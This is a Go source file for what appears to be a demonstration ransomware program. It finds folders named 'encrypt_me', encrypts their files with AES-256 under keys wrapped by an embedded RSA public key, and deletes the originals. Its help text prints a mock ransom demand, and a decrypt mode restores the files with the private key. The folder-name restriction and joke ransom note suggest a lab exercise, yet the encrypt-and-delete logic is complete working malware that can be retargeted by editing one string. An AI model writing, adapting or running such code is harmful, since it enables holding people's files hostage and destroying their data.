package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/binary"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"github.com/charmbracelet/log"
)

var (
	logger *log.Logger
	// Default public pemkey (PEM format)
	pemkey = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxv05aOxftYVZUU2GLOdc DXXF/XX6fxmaTeEOHV4NYkdQ6FchXxXpIypf0X8nW4XK0jPJwK8shQl8gY1HJ6TQ nX4x4WcjRwOwM3zwP97S1PPgq/Jcx9xGRZ5KQbQSc3DngW0k8te8lSDeGmwwIG/P rtx8NnNWtZWop/t46H2cLtEdGj9w43o1M8aDcFUaMwF9GvsDQV5U9AJAfpqzYnLE GgOKIDaq5YSJXuQw/9bTaafdRkJ5i8af8rbYaEkE475PGxA5JOqx86VFvqzr/y6X ECjTQiRhFrw5SxgZPelcZWRPxtUhP4A4L3OlfJjvn5XKfgFrXbvSSfOubvOK5cyV CQIDAQAB\n-----END PUBLIC KEY-----"
)

func main() {
	logger = log.NewWithOptions(os.Stdout, log.Options{
		ReportCaller:    true, // Include caller info in logs
		ReportTimestamp: true, // Include timestamps
	})
	logger.SetPrefix("[Main]")

	_flag_debug := os.Getenv("DEBUG")
	switch _flag_debug {
	case "true":
		fallthrough
	case "1":
		logger.SetLevel(log.DebugLevel)
		logger.Debug("DEBUG Mode Set")
	default:
		logger.SetLevel(log.InfoLevel)
	}

	if len(os.Args) >= 1 {
		logger.Debug(os.Args)
	}

	valid_dirs := make([]string, 0)

	current_dir, err := os.Getwd()
	if err != nil || current_dir == "" {
		logger.Fatalf("Unable to get handle to current working dir: %v", err)
	} else {
		valid_dirs = append(valid_dirs, current_dir)
	}

	// Define flags
	help := flag.Bool("h", false, "Help")
	decrypt := flag.Bool("d", false, "Decrypt mode")

	flag.Parse()

	// if decrypt requested, attempt to decrypt instead of encrpyting
	if *help {
		log.Info("To decrypt your files, wire 1 bazillion dollars to my bank account <notrealaccountnumber>. When you receive your decryption key via email, copy it and this executable into the directory at the same level as the folder \"encrypt me\" and run it with the CLI argument -d.")
		return
	}

	// if decrypt requested, attempt to decrypt instead of encrpyting
	if *decrypt {
		Decrypt(valid_dirs)
		return
	}

	Encrypt(valid_dirs)
}

func Encrypt(valid_dirs []string) {
	logger.Infof("Executing in: [%v]", strings.Join(valid_dirs, " ; "))
	logger.Debugf("Attempting to parse pubkey from PEM: \n%v\n", pemkey)
	pubkey, err := ParsePublicKeyFromPEM(pemkey)
	if err != nil {
		logger.Error("Failed to parse rsa pubkey from PEM")
	}

	var filesToEncrypt []string
	for _, p := range valid_dirs {
		err := filepath.Walk(p, func(path string, info fs.FileInfo, err error) error {
			if err != nil {
				logger.Errorf("Failed to access %v", path)
				return err
			}
			if !info.IsDir() || info.Name() != "encrypt_me" {
				return nil
			}

			// Collect all files first
			filepath.WalkDir(path, func(path string, d os.DirEntry, err error) error {
				if err != nil {
					return err
				}

				// Skip directories and already encrypted files
				if !d.IsDir() && !strings.HasSuffix(path, ".enc") {
					filesToEncrypt = append(filesToEncrypt, path)
				}

				return nil
			})
			if err != nil {
				logger.Errorf("Error while looking for files to encrypt: %v", err)
			}
			return nil
		})
		if err != nil {
			logger.Errorf("Error while looking for directory to encrypt: %v", err)
		}
		for _, filepath := range filesToEncrypt {
			err := EncryptFileAsymmetric(filepath, pubkey)
			if err != nil {
				logger.Errorf("Failed to encrypt regular file: %v", filepath)
			}
		}
	}

}

// Hybrid encryption: RSA + AES
func EncryptFileAsymmetric(path string, publicKey *rsa.PublicKey) error {
	// Read the file
	plaintext, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// Generate a random AES key (32 bytes = AES-256)
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return err
	}

	// Encrypt the file with AES
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return err
	}

	// Pad plaintext
	plaintext = Pad(plaintext, aes.BlockSize)

	// Create IV and ciphertext
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)

	// Encrypt the AES key with RSA
	encryptedAESKey, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		publicKey,
		aesKey,
		nil,
	)
	if err != nil {
		return err
	}

	// Write output file: [encrypted_key_length][encrypted_key][encrypted_data]
	output, err := os.Create(path + ".enc")
	if err != nil {
		return err
	}
	defer output.Close()

	// Write length of encrypted AES key (4 bytes)
	keyLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(keyLenBuf, uint32(len(encryptedAESKey)))
	if _, err := output.Write(keyLenBuf); err != nil {
		return err
	}

	// Write encrypted AES key
	if _, err := output.Write(encryptedAESKey); err != nil {
		return err
	}

	// Write encrypted file data
	if _, err := output.Write(ciphertext); err != nil {
		return err
	}

	// Delete original file
	if err := os.Remove(path); err != nil {
		logger.Errorf("Failed to remove original file %v", path)
		return err
	}

	return nil
}

// Decryption Logic
func Decrypt(valid_dirs []string) {
	var filesToRemove []string
	// Load private key from current directory
	privateKey, err := loadPrivateKeyFromCurrentDir()
	if err != nil {
		logger.Fatalf("Error loading private key: %v\n", err)
		os.Exit(1)
	}

	for _, p := range valid_dirs {
		err := filepath.Walk(p, func(path string, info fs.FileInfo, err error) error {
			if err != nil {
				logger.Errorf("Failed to access path %q: %v\n", path, err)
				return err
			}
			if !info.IsDir() || info.Name() != "encrypt_me" {
				return nil
			}

			filesToRemove, err = decryptDirectory(path, privateKey)
			return err
		})
		if err != nil {
			logger.Errorf("%v", err)
		}
	}
	for _, filepath := range filesToRemove {
		os.Remove(filepath)
	}
}

// Recursively decrypt all .enc files in a directory
func decryptDirectory(dirPath string, privateKey *rsa.PrivateKey) ([]string, error) {
	var encryptedFiles []string
	var decryptedFiles []string
	var errors []string

	// Walk the directory tree to find all .enc files
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Skip directories, only process files
		if !info.IsDir() && strings.HasSuffix(path, ".enc") {
			encryptedFiles = append(encryptedFiles, path)
		}

		return nil
	})

	if err != nil {
		return nil, fmt.Errorf("error walking directory: %v", err)
	}

	if len(encryptedFiles) == 0 {
		return nil, fmt.Errorf("no .enc files found in %s", dirPath)
	}

	logger.Infof("Found %d encrypted file(s)\n", len(encryptedFiles))

	// Decrypt each file
	successCount := 0
	for _, encFile := range encryptedFiles {
		logger.Debugf("Decrypting: %s\n", encFile)
		err := decryptSingleFile(encFile, privateKey)
		if err != nil {
			errMsg := fmt.Sprintf("  ✗ Failed: %v", err)
			logger.Debug(errMsg)
			errors = append(errors, fmt.Sprintf("%s: %v", encFile, err))
		} else {
			logger.Debugf("  ✓ Success: %s\n", removeEncExtension(encFile))
			decryptedFiles = append(decryptedFiles, encFile)
			successCount++
		}
	}

	logger.Infof("\nDecryption complete: %d/%d successful\n", successCount, len(encryptedFiles))

	if len(errors) > 0 {
		return nil, fmt.Errorf("%d file(s) failed to decrypt", len(errors))
	}

	return decryptedFiles, nil
}

// Decrypt a single file
func decryptSingleFile(encPath string, privateKey *rsa.PrivateKey) error {
	// Decrypt the file
	plaintext, err := DecryptFileAsymmetric(encPath, privateKey)
	if err != nil {
		return err
	}

	// Write decrypted content (remove .enc extension)
	outputPath := removeEncExtension(encPath)
	err = os.WriteFile(outputPath, plaintext, 0644)
	if err != nil {
		return fmt.Errorf("error writing decrypted file: %v", err)
	}
	return nil
}

// Decrypt file with private key
func DecryptFileAsymmetric(encPath string, privateKey *rsa.PrivateKey) ([]byte, error) {
	// Read encrypted file
	data, err := os.ReadFile(encPath)
	if err != nil {
		return nil, err
	}

	if len(data) < 4 {
		return nil, fmt.Errorf("invalid encrypted file")
	}

	// Read encrypted AES key length
	keyLen := binary.BigEndian.Uint32(data[:4])
	if len(data) < int(4+keyLen) {
		return nil, fmt.Errorf("invalid encrypted file format")
	}

	// Extract encrypted AES key and decrypt it with RSA
	encryptedAESKey := data[4 : 4+keyLen]
	aesKey, err := rsa.DecryptOAEP(
		sha256.New(),
		rand.Reader,
		privateKey,
		encryptedAESKey,
		nil,
	)
	if err != nil {
		return nil, err
	}

	// Extract encrypted file data
	ciphertext := data[4+keyLen:]
	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	// Decrypt with AES
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// 6. Unpad
	plaintext, err = Unpad(plaintext)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

// Shared Logic
func Pad(data []byte, blockSize int) []byte {
	n := blockSize - len(data)%blockSize
	padding := make([]byte, n)
	for i := range padding {
		padding[i] = byte(n)
	}
	return append(data, padding...)
}

func Unpad(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("data is empty")
	}
	padLen := int(data[len(data)-1])
	if padLen > len(data) || padLen == 0 {
		return nil, fmt.Errorf("invalid padding")
	}
	return data[:len(data)-padLen], nil
}

// Parse PEM-encoded public key
func ParsePublicKeyFromPEM(pemStr string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pemStr))
	if block == nil {
		return nil, fmt.Errorf("failed to parse PEM block")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not an RSA public key")
	}

	return rsaPub, nil
}

// Load private key from current directory
// Looks for common private key filenames
func loadPrivateKeyFromCurrentDir() (*rsa.PrivateKey, error) {
	// Common private key filenames to check
	possibleFiles := []string{
		"private.pem",
		"privkey.pem",
		"id_rsa",
		"private_key.pem",
	}

	for _, filename := range possibleFiles {
		if _, err := os.Stat(filename); err == nil {
			// File exists, try to load it
			privateKey, err := loadPrivateKeyFromFile(filename)
			if err == nil {
				logger.Infof("Loaded private key from: %s\n", filename)
				return privateKey, nil
			}
		}
	}

	return nil, fmt.Errorf("no private key found in current directory")
}

// Load and parse private key from file
func loadPrivateKeyFromFile(path string) (*rsa.PrivateKey, error) {
	keyData, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	block, _ := pem.Decode(keyData)
	if block == nil {
		return nil, fmt.Errorf("failed to parse PEM block from %s", path)
	}

	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		// Try PKCS8 format
		key, err2 := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err2 != nil {
			return nil, fmt.Errorf("failed to parse private key: %v", err)
		}
		var ok bool
		privateKey, ok = key.(*rsa.PrivateKey)
		if !ok {
			return nil, fmt.Errorf("not an RSA private key")
		}
	}

	return privateKey, nil
}

// Remove .enc extension from filename
func removeEncExtension(filename string) string {
	if filepath.Ext(filename) == ".enc" {
		logger.Debugf("Removing ext .enc from file %v", filename)
		return filename[:len(filename)-4]
	}
	return filename
}
